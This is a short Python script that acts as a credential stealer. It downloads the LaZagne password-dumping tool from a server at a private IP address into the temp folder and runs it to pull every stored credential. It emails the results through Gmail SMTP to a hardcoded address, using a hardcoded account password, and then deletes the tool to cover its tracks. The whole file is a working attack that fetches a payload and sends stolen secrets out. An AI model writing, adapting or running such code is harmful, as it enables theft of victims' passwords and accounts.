import subprocess, smtplib, re, requests, os, tempfile

def send_mail(email,password,message):
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()	



def download(url):
	get_responce = requests.get(url)
	filename = url.split('/')
	new_filename = filename[-1]
	with open(new_filename,"wb") as file:
		file.write(get_responce.content)
		file.close()
	return new_filename


url = "http://192.168.6.128/vs/laZagne_x86.exe"
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
filename = download(url)
try:
	command = "{filename} all".format(filename=filename)
	result = subprocess.check_output(command,shell=True)
	send_mail("mailtoaict@gmail.com","Aict@123",result)
	os.remove(filename)
except:
	os.remove(filename)